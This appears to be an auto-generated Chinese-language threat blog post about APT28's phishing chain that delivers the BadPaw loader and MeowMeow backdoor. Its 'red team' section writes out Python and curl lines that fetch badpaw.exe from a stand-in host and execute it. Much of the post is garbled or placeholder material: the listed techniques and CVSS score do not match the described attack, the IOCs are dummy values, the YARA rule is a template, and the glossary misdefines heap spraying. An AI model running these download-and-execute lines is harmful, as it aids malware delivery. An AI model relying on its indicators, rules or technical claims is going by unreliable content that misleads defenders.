---
layout: post
title:  "APT28對烏克蘭散布惡意程式BadPaw Loader與MeowMeow"
date:   2026-03-06 06:39:12 +0000
categories: [security]
severity: critical
---

# 🚨 解析 APT28 的多階段攻擊鏈：BadPaw 和 MeowMeow 惡意程式
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Heap Spraying`, `Deserialization`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: APT28 利用了釣魚郵件和惡意程式的組合，透過 HTA 應用程式下載和執行 BadPaw 和 MeowMeow 惡意程式，進而取得遠端控制權。
* **攻擊流程圖解**:
  1. 使用者點擊釣魚郵件中的連結，下載 ZIP 壓縮檔。
  2. 壓縮檔包含偽裝為 HTML 文件的 HTA 應用程式。
  3. HTA 應用程式下載 BadPaw 惡意程式載入工具（loader）。
  4. BadPaw 下載 MeowMeow 後門程式。
  5. MeowMeow 執行多種操作，包括檔案讀寫、檢查系統中的檔案和資料、執行遠端指令和 PowerShell 命令。
* **受影響元件**: Windows 作業系統，特別是使用 ukr[.]net 郵件服務的用戶。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要使用者點擊釣魚郵件中的連結，並具有執行 HTA 應用程式的權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    import os
    
    # 下載 BadPaw 惡意程式載入工具
    badpaw_url = "https://example.com/badpaw.exe"
    response = requests.get(badpaw_url)
    with open("badpaw.exe", "wb") as f:
        f.write(response.content)
    
    # 執行 BadPaw 惡意程式
    os.system("badpaw.exe")
    
    ```
 

```

bash
curl -o badpaw.exe https://example.com/badpaw.exe
badpaw.exe

```
* **繞過技術**: BadPaw 和 MeowMeow 惡意程式使用 .NET Reactor 進行程式混淆，以增加逆向工程難度。另外，惡意程式會檢查是否在虛擬機器（VM）或分析環境中執行，若偵測到則會終止運作。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\badpaw.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule BadPaw_Detection {
      meta:
        description = "Detects BadPaw malware"
        author = "Your Name"
      strings:
        $badpaw_string = "BadPaw" wide
      condition:
        $badpaw_string at pe.entry_point
    }
    
    ```
 

```

snort
alert tcp any any -> any any (msg:"BadPaw malware detected"; content:"BadPaw"; sid:1000001; rev:1;)

```
* **緩解措施**: 更新作業系統和應用程式至最新版本，使用防毒軟體和防火牆，避免點擊可疑的連結和下載附件。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Heap Spraying**: 想像一塊記憶體空間，攻擊者可以在這塊空間中填充惡意程式碼，然後利用漏洞執行這些程式碼。技術上是指攻擊者在堆疊中分配大量的記憶體空間，以便在這些空間中執行惡意程式碼。
* **Deserialization**: 想像一個物件被序列化成字串，然後被反序列化回物件。技術上是指將資料從字串或其他格式轉換回物件或結構體。
* **eBPF**: 想像一個小型的程式碼片段，可以在 Linux 核心中執行。技術上是指 extended Berkeley Packet Filter，一種在 Linux 核心中執行的小型程式碼片段，通常用於網路封包過濾和分析。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/174232)
- [MITRE ATT&CK](https://attack.mitre.org/)


